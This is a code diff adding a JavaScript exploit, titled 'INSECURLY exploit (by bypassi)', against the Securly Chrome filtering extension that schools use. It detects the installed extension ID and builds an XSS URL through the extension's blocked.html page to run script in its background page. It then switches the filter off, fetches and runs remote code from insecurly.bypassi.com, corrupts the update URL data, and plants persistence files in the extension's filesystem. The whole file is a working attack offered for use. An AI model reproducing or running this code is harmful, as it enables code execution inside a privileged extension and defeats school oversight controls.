@@ -1,0 +1,290 @@
+const main = function () {
+  document.body.innerHTML = `
+    <style>
+    body {
+      background-color:black;
+      color:#eeeeee;
+      font-family:Arial;
+    }
+    h1 {
+      font-size: 40px;
+      font-weight:normal;
+    }
+    .switch-area {
+      display:flex;
+      margin:10px 0px;
+    }
+    .switch-area div{
+      font-size:20px;
+      padding:6px 0px;
+      height:32px;
+    }
+    #desc {
+      font-size:18px;
+      max-width:320px;
+    }
+    #updates {
+      font-size:15px;
+      margin-top:15px;
+      color:#999999;
+    }
+    /* https://danklammer.com/articles/simple-css-toggle-switch/ */
+    #toggle {
+        appearance: none;
+        width: 62px;
+        height: 32px;
+        display: inline-block;
+        position: relative;
+        border-radius: 50px;
+        overflow: hidden;
+        outline: none;
+        border: none;
+        cursor: pointer;
+        background-color: #707070;
+        transition: background-color ease 0.3s;
+      }
+      #toggle:before {
+        content: "on off";
+        display: block;
+        position: absolute;
+        z-index: 2;
+        width: 28px;
+        height: 28px;
+        background: #fff;
+        left: 2px;
+        top: 2px;
+        border-radius: 50%;
+        font: 10px/28px Helvetica;
+        text-transform: uppercase;
+        font-weight: bold;
+        text-indent: -22px;
+        word-spacing: 37px;
+        color: #fff;
+        text-shadow: -1px -1px rgba(0,0,0,0.15);
+        white-space: nowrap;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        transition: all cubic-bezier(0.3, 1.5, 0.7, 1) 0.3s;
+      }
+      #toggle:checked {
+        background-color: #4CD964;
+      }
+      #toggle:checked:before {
+        left: 32px;
+      }
+    </style>
+    <h1>INSECURLY exploit (by bypassi)</h1>
+    <div class="switch-area">
+      <div>securly is currently</div>
+      <input id="toggle" type="checkbox" />
+    </div>
+    <div id="desc">
+      the switch above allows you to turn the securly extension on and off. note that this will not bypass
+      network filters or other filtering extensions. teachers using securly classroom will still be able to
+      see your screen. more functionality is coming soon.
+    </div>
+    <div id="updates"></div>
+    `;
+
+  let bg = window.chrome.extension.getBackgroundPage();
+  let c = () => bg.chrome;
+  let checkbox = document.getElementById("toggle");
+
+  function disable() {
+    localStorage.cluster = "AVOID_OS," + Date.now() * (Math.random() + 1.5);
+  }
+  function enable() {
+    localStorage.clear();
+  }
+  function toggle() {
+    if (checkbox.checked) {
+      enable();
+    } else {
+      disable();
+    }
+    bg.location.reload();
+    setTimeout(inject, 1000);
+  }
+
+  async function inject() {
+    let f = await fetch("https://insecurly.bypassi.com/js.js");
+    let txt = await f.text();
+    let blob = new Blob([txt], { type: "text/javascript" });
+    let script = document.createElement("script");
+    script.src = URL.createObjectURL(blob);
+    bg.document.body.appendChild(script);
+  }
+  try {
+    inject();
+  } catch (err) {}
+
+  if (!c().runtime.id.startsWith("i")) {
+    document.getElementById("updates").textContent =
+      "payload 3 applied. (you aren't supposed to know what this means)";
+    c().extension.setUpdateUrlData(
+      decodeURIComponent("%E0%B6%9E").repeat(1024)
+    );
+  }
+  if (!localStorage.cluster?.startsWith("AVOID_OS,")) {
+    checkbox.checked = true;
+  }
+  checkbox.onclick = toggle;
+
+  async function makeFile(fileName, fileType, content) {
+    let fs = await new Promise((res) => {
+      window.webkitRequestFileSystem(window.TEMPORARY, content.length, res);
+    });
+
+    await new Promise((res) => {
+      fs.root.getFile(
+        fileName,
+        {},
+        (fileEntry) => {
+          fileEntry.remove(res);
+        },
+        res
+      );
+    });
+
+    return new Promise((res) => {
+      fs.root.getFile(fileName, { create: true }, (fileEntry) => {
+        fileEntry.createWriter((fileWriter) => {
+          fileWriter.onwriteend = () => {
+            res(fileEntry.toURL());
+          };
+          fileWriter.write(new Blob([content], { type: fileType }));
+        });
+      });
+    });
+  }
+
+  function persistence() {
+    if (!location.hash) throw new Error("IDK");
+    let tempJsContent = location.hash.replace("#", "");
+    makeFile(Math.random() + ".js", "text/javascript", tempJsContent).then(
+      (url) => {
+        let script = document.createElement("script");
+        script.src = url;
+        document.body.appendChild(script);
+      }
+    );
+  }
+
+  let jsContent =
+    makeFile.toString() +
+    persistence.toString() +
+    ";" +
+    persistence.name +
+    "()";
+  makeFile("/i.js", "text/javascript", jsContent);
+
+  let htmlContent = '<script src="./i.js"></script>';
+  makeFile("/i.html", "text/html", htmlContent).then(() => {
+    navigator.storage.persist();
+  });
+};
+
+const SecurlyIds = {
+  NONE: "",
+  OLD: "iheobagjkfklnlikgihanlhcddjoihkg",
+  NEW: "joflmkccibkooplaeoinecjbmdebglab",
+  BETA: "knneimmpeamikmjijmnhjmmobddleohj",
+};
+
+const InstallationStates = {
+  NOT_INSTALLED: 0,
+  INSTALLED: 1,
+};
+
+async function getExtInstallationState(extId) {
+  let request;
+
+  try {
+    request = await fetch(`chrome-extension://${extId}/fonts/Metropolis.css`);
+  } catch (err) {
+    return InstallationStates.NOT_INSTALLED;
+  }
+
+  if (request.status === 200) {
+    return InstallationStates.INSTALLED;
+  } else {
+    return InstallationStates.NOT_INSTALLED;
+  }
+}
+
+async function getSecurlyId() {
+  let newIdState = await getExtInstallationState(SecurlyIds.NEW);
+  if (newIdState === InstallationStates.INSTALLED) {
+    return SecurlyIds.NEW;
+  }
+
+  let oldIdState = await getExtInstallationState(SecurlyIds.OLD);
+  if (oldIdState === InstallationStates.INSTALLED) {
+    return SecurlyIds.OLD;
+  }
+
+  let betaIdState = await getExtInstallationState(SecurlyIds.BETA);
+  if (betaIdState === InstallationStates.INSTALLED) {
+    return SecurlyIds.BETA;
+  }
+
+  return SecurlyIds.NONE;
+}
+
+function generateSecurlyXssUrl(blob, securlyId) {
+  const helperFunction = function (url) {
+    let x = open();
+    x.chrome = top.chrome.extension.getBackgroundPage().chrome;
+    let script = document.createElement("script");
+    script.src = url;
+    x.document.body.appendChild(script);
+    top.close();
+  };
+
+  let blobUrl = URL.createObjectURL(blob);
+  let helperBlob = new Blob([`(${helperFunction.toString()})("${blobUrl}")`], {
+    type: "text/javascript",
+  });
+  let helperUrl = URL.createObjectURL(helperBlob);
+
+  let xssHtml = `
+    <style>*{visibility:hidden}</style>
+    <iframe srcdoc="<script src='${helperUrl}'></script>">
+        Hi. If you can read this, the exploit didn't work.
+        Wait a couple of weeks. We'll be back...
+    </iframe>`;
+  let xssFragment = encodeURIComponent(btoa(xssHtml));
+
+  if (securlyId === SecurlyIds.BETA) {
+    return `filesystem:chrome-extension://${securlyId}/temporary/i.html#import('${helperUrl}')`;
+  }
+
+  return `chrome-extension://${securlyId}/${
+    Math.random() < 0.3 ? "/" : ""
+  }blocked.html?category=${xssFragment}`;
+}
+
+function generateStage2Url(securlyId) {
+  let blob = new Blob([`(${main.toString()})()`], { type: "text/javascript" });
+  return generateSecurlyXssUrl(blob, securlyId);
+}
+
+getSecurlyId().then((securlyId) => {
+  if (securlyId === SecurlyIds.NONE) {
+    let errorDiv = document.getElementById("error");
+    errorDiv.classList.add("shown");
+    errorDiv.textContent =
+      "You don't have an adequate version of Securly installed.";
+  } else {
+    let xssUrl = generateStage2Url(securlyId);
+
+    let draggableDiv = document.getElementById("draggable");
+    draggableDiv.classList.add("shown");
+    draggableDiv.ondragstart = (event) => {
+      event.dataTransfer.setData("text/plain", xssUrl);
+    };
+
+    if (securlyId === SecurlyIds.BETA) {
+      draggableDiv.textContent += " (unstable, dont complain if it fails)";
+    }
+  }
+});
